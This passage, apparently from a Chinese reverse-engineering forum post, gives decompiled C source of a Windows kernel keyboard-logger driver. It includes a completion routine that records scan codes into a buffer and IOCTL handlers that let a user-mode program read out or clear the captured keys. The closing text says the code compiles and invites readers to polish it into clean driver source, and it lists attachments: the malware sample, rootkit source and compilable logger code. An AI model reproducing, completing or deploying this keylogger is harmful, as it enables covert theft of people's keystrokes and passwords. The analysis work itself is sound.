
```c
  //v7 = (struct _IRP::$::$::$::$A02EC6A2CE86544F716F4825015773AC::_IO_STACK_LOCATION *)((char *)v7 - 36);  
  v7 = (struct _IO_STACK_LOCATION *)((char *)v7 - 36);  
  * ((_DWORD *)v7 + 8) = v6;  
  * ((_BYTE *)v7 + 3) = -32;  
  return IofCallDriver(* ((PDEVICE_OBJECT *)v3 + 1), v5);  
}  

//----- (00010708) --------------------------------------------------------  

int __stdcall KeyboardRecord(PDEVICE_OBJECT DeviceObject, PIRP Irp, PVOID Context)  
{  
  PVOID v3; // ebx@1  
  PIRP v4; // esi@1  
  struct _IRP *v5; // ecx@2  
  unsigned __int8 v7; // of@5  
  char v8; // sf@5  
  __int16 v9; // cx@9  
  v4 = Irp;  
  v3 = DeviceObject->DeviceExtension;  
  if ( !Irp->IoStatus.Status )  
  {  
    v5 = Irp->AssociatedIrp.MasterIrp;  
    if ( v5 )  
    {  
      if ( (signed int)(Irp->IoStatus.Information / 0xC) >= 0 )  
      {  
        if ( !LOWORD(v5->MdlAddress) )  
        {  
          KeyBuffer[HitCount] = v5->Size;  
          //v7 = __SETO__(HitCount + 1, 512);  
          //v8 = HitCount++ < 511;  
          //if ( !(v8 ^ v7) )  
            //HitCount = 0;  
    HitCount++;  
    if(HitCount>=512) HitCount = 0;  
        }  
        if ( LOWORD(v5->MdlAddress) == 1 )  
        {  
          if ( !HitCount )  
          {  
            v9 = v5->Size;  
            HitCount = 1;  
            KeyBuffer[0] = v9;  
          }  
        }  
      }  
    }  
  }  
  if ( v4->PendingReturned )  
    * ((_BYTE *)v4->Tail.Overlay.CurrentStackLocation + 3) |= 1u;  
  HIBYTE(DeviceObject->Size) = KfAcquireSpinLock((PKSPIN_LOCK)v3 + 5);  
  InterlockedDecrement((volatile LONG *)v3 + 4);  
  KfReleaseSpinLock((PKSPIN_LOCK)v3 + 5, HIBYTE(DeviceObject->Size));  
  return v4->IoStatus.Status;  
}  

//----- (000107BA) --------------------------------------------------------  

int __stdcall DispatchIoControl(PDEVICE_OBJECT DeviceObject, PIRP irp)  
{  
  signed int v2; // eax@1  
  unsigned int v3; // edx@1  
  PIRP v4; // ebx@1  
  int v5; // esi@1  
  //struct _IRP::$::$::$::$A02EC6A2CE86544F716F4825015773AC::_IO_STACK_LOCATION *v7; // eax@1  
  struct _IO_STACK_LOCATION *v7; // eax@1  
  int v8; // eax@7  
  v4 = irp;  
  v5 = 0;  
  v7 = irp->Tail.Overlay.CurrentStackLocation;  
  v3 = * ((_DWORD *)v7 + 1);  
  v2 = * ((_DWORD *)v7 + 3);  
  if ( v2 != 0xB0008 )  
  {  
    if ( v2 == 0x80102180 )  
    {  
      HitCount = 0;  
      memset(KeyBuffer, 0, 0x400u);  
    }  
    else  
    {  
      if ( v2 == 0x80102184 )  
      {  
        memcpy(irp->AssociatedIrp.MasterIrp, KeyBuffer, v3);  
        v5 = 0;  
        v4->IoStatus.Information = v3;  
        v4->IoStatus.Status = 0;  
LABEL_12:  
        IofCompleteRequest(v4, 0);  
        return v5;  
      }  
      if ( v2 == 0x80102187 )  
      {  
        if ( HitCount )  
        {  
          KeyBuffer[HitCount] = 0xEEu;  
          v8 = HitCount++ + 1;  
          if ( v8 >= (signed int)0x200u )  
            HitCount = 0;  
        }  
      }  
      else  
      {  
        v5 = 0xC0000010u;  
      }  
    }  
    v4->IoStatus.Information = 0;  
    goto LABEL_12;  
  }  
  return PassCurrentIRP(DeviceObject, irp);  
}  

//----- (00010874) --------------------------------------------------------  

int __stdcall DispatchCreate(PDEVICE_OBJECT DeviceObject, PIRP Irp)  
{  
  Irp->IoStatus.Status = 0;  
  Irp->IoStatus.Information = 0;  
  IofCompleteRequest(Irp, 0);  
  return 0;  
}  

//----- (0001088E) --------------------------------------------------------  

NTSTATUS __stdcall PassCurrentIRP(PDEVICE_OBJECT DeviceObject, PIRP Irp)  
{  
  PDEVICE_OBJECT v3; // eax@1  
  v3 = DeviceObject;  
  ++Irp->CurrentLocation;  
  //Irp->Tail.Overlay.CurrentStackLocation = (struct _IRP::$::$::$::$A02EC6A2CE86544F716F4825015773AC::_IO_STACK_LOCATION *)((char *)Irp->Tail.Overlay.CurrentStackLocation + 36);  
  Irp->Tail.Overlay.CurrentStackLocation = (struct _IO_STACK_LOCATION *)((char *)Irp->Tail.Overlay.CurrentStackLocation + 36);  
  return IofCallDriver(* ((PDEVICE_OBJECT *)v3->DeviceExtension + 1), Irp);  
}  

// ALL OK, 10 function(s) have been successfully decompiled  
```

以上代码虽可编译，但仍有很多中间变量，宏替换代码等，进一步优化即可得到一份符合驱动程序编写规范的源代码，留给有兴趣的朋友完成。

- `样本.rar` [解压密码：`PEDIY`]
- `Fuzen.rar` --------`Fuzen` 的开源代码，`msdtx.sys` 来自这里
- `KBLOG_C.rar` --------主程序逆向的 C 代码 `VC6.0` 编译通过 [解压密码：`pediy`]
- `KBDRV_C.rar` --------`hexrays` 逆向出来的伪代码，`win2k` 下 `ddk` 编译通过
- `KBDRV_IDB.rar` --------驱动的 `IDA` 保存文件，汇编代码详细注释 [解压密码：`pediy`]
- `部分汇编代码注释.txt` --------主程序重点汇编代码注释

bambooooo
